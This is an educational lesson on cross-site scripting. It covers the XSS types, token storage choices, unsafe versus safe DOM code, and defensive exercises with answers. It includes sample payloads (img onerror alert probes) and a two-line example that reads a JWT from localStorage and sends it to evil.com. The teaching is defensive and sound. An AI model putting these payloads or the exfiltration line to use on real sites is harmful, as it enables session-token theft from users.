# XSS (Cross-Site Scripting)

> **Level 4 — Security & Authentication**
> Injected script stealing tokens; why you never store JWT carelessly.

---

## 1. Prerequisites
- [JWT (JSON Web Tokens)](jwt.md) — The token format commonly stored on clients.
- [Cookies](../level_09/cookies.md) — The browser storage mechanism that can be secured using HttpOnly.

---

## 2. Term Category

**Security (Browser-Specific: Vulnerabilities exist in the browser DOM rendering layer and client storage.)**: XSS (Cross-Site Scripting) is a fundamental concept in this technology stack. **Level 4 — Security & Authentication**

---

## 3. Explanation

### (1) Design Motivation — "Why did we design this?"
If an attacker can execute their own malicious JavaScript code inside a user's browser tab on your domain, they gain full control over that session. They can capture keystrokes, modify the page UI to display fake forms, and read any credentials stored in the browser's memory.

This script injection exploit is called **Cross-Site Scripting (XSS)**.

---

### (2) Types of XSS

- **Stored XSS:** The malicious script is permanently stored on the database (e.g. in a comment section). Every time other users visit the page, the database loads the script, and their browsers execute it.
- **Reflected XSS:** The script is passed as a URL query parameter (e.g. `https://myapi.com/search?q=<script>steal()</script>`). If the server prints the search query directly back into the page HTML without escaping it, the script runs immediately.
- **DOM-based XSS:** The vulnerability exists entirely in client-side JavaScript (e.g. reading a URL fragment and passing it directly to `element.innerHTML` without sanitization).

---

### (3) The Storage Security Dilemma: LocalStorage vs. HttpOnly Cookies
Where should you store access tokens (like JWTs) to keep them safe from XSS?

#### 1. Web Storage (`localStorage` / `sessionStorage`)
- **Behavior:** Accessible by any client-side JavaScript running on the origin.
- **XSS Risk:** **Extremely High**. If your site has an XSS vulnerability, an injected script can extract your JWT in a single line of code:
  ```javascript
  // Stolen in milliseconds by hacker script:
  const token = localStorage.getItem('jwt');
  fetch(`https://evil.com/steal?token=${token}`);
  ```

#### 2. HttpOnly Cookies
- **Behavior:** The browser attaches the cookie automatically to requests but blocks client-side JavaScript from accessing it.
- **XSS Risk:** **Protected**. Even if an attacker executes an XSS script on your page, calling `document.cookie` returns empty. The script cannot steal the cookie payload directly.

---

### (4) Reality Metaphor
Imagine your office has a directory containing a confidential contract.
- Storing a token in **`localStorage`** is like leaving the **folder open on top of your desk**. Anyone who walks into your office (including a disguised spy—the **injected script**) can look down, copy the contents, and walk out.
- Storing a token in an **`HttpOnly` Cookie** is like locking the folder inside a **wall drop-box**. You can drop letters in, and the courier handles delivery automatically. However, nobody inside the office (even you, or the spy) has the key to open the box and read the contract.
- **Input Sanitization** is like a **security guard** scanning everyone at the door, making sure they do not bring dangerous packages (like script tags) into the office.

---

### (5) Vulnerability Code Example (DOM-based XSS)

#### Unsafe: Using `innerHTML`
```javascript
const nameParam = new URLSearchParams(window.location.search).get('name');
// If nameParam is "<img src=x onerror='alert(1)'>", the script runs!
document.getElementById('greeting').innerHTML = `Hello, ${nameParam}`; 
```

#### Safe: Using `textContent`
```javascript
const nameParam = new URLSearchParams(window.location.search).get('name');
// Safely renders "<img src=x...>" as plain text rather than executing it.
document.getElementById('greeting').textContent = `Hello, ${nameParam}`; 
```

---

## 4. Common Mistakes & Pitfalls

### Mistake 1: Relying on input sanitization alone

**The mistake:** Assuming that because you strip out `<script>` tags from database inputs, your application is completely immune to XSS.

**Why it's wrong:** Attackers have dozens of creative ways to inject scripts without using standard `<script>` tags—for example, attaching handlers to invalid images (`<img src="x" onerror="alert(1)">`) or exploiting attributes in stylesheets.

*Fix:* Implement a strict **Content Security Policy (CSP)** HTTP header. A CSP tells the browser exactly which domains are allowed to load scripts and blocks inline script execution completely.

---

### Mistake 2: Injecting Un-Sanitized User Input directly into DOM via `innerHTML`

**The mistake:** Rendering user comment strings using `element.innerHTML = userInput`.

**Why it's wrong:** `innerHTML` executes raw HTML tags and embedded `<script>` tags, allowing attackers to inject malicious script code that steals session tokens and user data.

*Incorrect:*
```javascript
// Vulnerable DOM injection
div.innerHTML = `<p>${userComment}</p>`; // ❌ Executes embedded <script> tags!
```

*Fix:*
```javascript
// Safe text content assignment
div.textContent = userComment; // Escapes all HTML markup automatically
```

---

### Mistake 3: Relying on Blacklist String Matching for Input Sanitization

**The mistake:** Attempting to prevent XSS by stripping `<script>` tags using regex replace.

**Why it's wrong:** Attackers bypass simple string blacklists using event handlers (`<img src=x onerror=alert(1)>`), SVG vectors, or double encoding. Use HTML sanitizer libraries (DOMPurify).

*Incorrect:*
```javascript
const clean = input.replace(/<script>/gi, ''); // ❌ Bypassed by <img src=x onerror=...>!
```

*Fix:*
```javascript
const clean = DOMPurify.sanitize(input); // Robust HTML sanitization
```


---

## 5. Practice Exercises

### Exercise 1: HTML Input Sanitizer & Entity Encoder

**Scenario:** A Web API input sanitizer encodes dangerous HTML characters to prevent Stored Cross-Site Scripting (XSS) attacks.

**Requirements:**
1. Write sanitizeHtml(inputStr).
2. Replace special HTML characters (<, >, &, ", ') with corresponding HTML entities.

> [!check]- Answer
>
> #### Implementation
>
> ```javascript
> function sanitizeHtml(inputStr) {
>   if (typeof inputStr !== "string") return inputStr;
>
>   const entityMap = {
>     "&": "&amp;",
>     "<": "&lt;",
>     ">": "&gt;",
>     '"': "&quot;",
>     "'": "&#39;"
>   };
>
>   return inputStr.replace(/[&<>"']/g, char => entityMap[char]);
> }
>
> // Verification tests
> const untrusted = '<script>alert("XSS")</script>';
> const clean = sanitizeHtml(untrusted);
>
> console.assert(clean === '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;', "Test 1 Failed");
> console.assert(!clean.includes("<script>"), "Test 2 Failed");
> ```
>
> #### Technical Explanation
>
> 1. **XSS Vulnerability Mechanism**: Attackers inject malicious JavaScript into web pages viewed by other users.
> 2. **HTML Entity Encoding**: Converts executable script tags into plain text entity representations.
> 3. **Context-Aware Escaping**: Escaping rules differ for HTML body, HTML attributes, and JavaScript variable contexts.
> 
---

### Exercise 2: Content-Security-Policy Inline Script Block Auditor

**Scenario:** A security auditor checks Content-Security-Policy headers to ensure `unsafe-inline` scripts are disabled.

**Requirements:**
1. Write auditCspHeader(cspHeaderStr).
2. Verify script-src directive excludes 'unsafe-inline'.

> [!check]- Answer
>
> #### Implementation
>
> ```javascript
> function auditCspHeader(cspHeaderStr) {
>   if (!cspHeaderStr || typeof cspHeaderStr !== "string") {
>     return { valid: false, error: "Missing Content-Security-Policy header" };
>   }
>
>   const directives = cspHeaderStr.split(";").map(d => d.trim());
>   for (const dir of directives) {
>     if (dir.toLowerCase().startsWith("script-src")) {
>       if (dir.includes("'unsafe-inline'")) {
>         return {
>           valid: false,
>           error: "CRITICAL: CSP script-src allows 'unsafe-inline', rendering page vulnerable to XSS!"
>         };
>       }
>     }
>   }
>
>   return { valid: true };
> }
>
> // Verification tests
> const badCsp = "default-src 'self'; script-src 'self' 'unsafe-inline'";
> console.assert(auditCspHeader(badCsp).valid === false, "Test 1 Failed: Must flag unsafe-inline");
>
> const goodCsp = "default-src 'self'; script-src 'self' https://cdn.com";
> console.assert(auditCspHeader(goodCsp).valid === true, "Test 2 Failed");
> ```
>
> #### Technical Explanation
>
> 1. **CSP XSS Mitigation**: Content-Security-Policy header instructs browser which script sources are trusted to execute.
> 2. **Disabling inline scripts**: Removing 'unsafe-inline' blocks inline <script> tags injected by attackers via XSS.
> 3. **Nonce and Hash Based CSP**: Allows specific inline scripts using cryptographic nonces or SHA hashes.
> 
---

### Exercise 3: HttpOnly & Secure Cookie XSS Protection Auditor

**Scenario:** An API security validator verifies that authentication tokens stored in cookies include the `HttpOnly` flag to prevent XSS token theft.

**Requirements:**
1. Write verifyHttpOnlyCookie(setCookieHeader).
2. Verify presence of HttpOnly and Secure flags.

> [!check]- Answer
>
> #### Implementation
>
> ```javascript
> function verifyHttpOnlyCookie(setCookieHeader) {
>   if (!setCookieHeader || typeof setCookieHeader !== "string") {
>     return { secure: false };
>   }
>
>   const parts = setCookieHeader.split(";").map(p => p.trim().toLowerCase());
>   const hasHttpOnly = parts.includes("httponly");
>   const hasSecure = parts.includes("secure");
>
>   return {
>     secure: hasHttpOnly && hasSecure,
>     hasHttpOnly,
>     hasSecure
>   };
> }
>
> // Verification tests
> const c1 = "token=xyz; HttpOnly; Secure; SameSite=Strict";
> const res1 = verifyHttpOnlyCookie(c1);
> console.assert(res1.secure === true && res1.hasHttpOnly === true, "Test 1 Failed");
>
> const c2 = "token=xyz; SameSite=Lax";
> console.assert(verifyHttpOnlyCookie(c2).secure === false, "Test 2 Failed");
> ```
>
> #### Technical Explanation
>
> 1. **HttpOnly Cookie Flag**: Prevents client-side JavaScript (`document.cookie`) from reading the cookie.
> 2. **Mitigating XSS Token Theft**: Even if an attacker succeeds in executing XSS script, they cannot steal HttpOnly auth cookies.
> 3. **Secure Cookie Flag**: Ensures cookie is transmitted ONLY over encrypted HTTPS connections.
---

## 6. Related Terms
- [CSRF (Cross-Site Request Forgery)](csrf.md) — The complementary session-riding exploit.
- [localStorage & sessionStorage](../level_09/web_storage.md) — The client-side Web Storage APIs vulnerable to XSS theft.
- [Cookie Attributes (HttpOnly, Secure, SameSite)](../level_09/cookie_attributes.md) — Related concept: Cookie Attributes (HttpOnly, Secure, SameSite).

---

## 7. Key Takeaways
- XSS occurs when an attacker successfully injects and runs malicious JavaScript inside a user's browser tab.
- Stored XSS resides in databases; Reflected XSS rides on URLs; DOM XSS exists in client rendering.
- Any token stored in localStorage is vulnerable to theft via XSS.
- Storing tokens in `HttpOnly` cookies blocks client-side JS from reading them, securing them from XSS theft.
- Defend against XSS by using `textContent` instead of `innerHTML`, sanitizing inputs, and enforcing Content Security Policies (CSP).
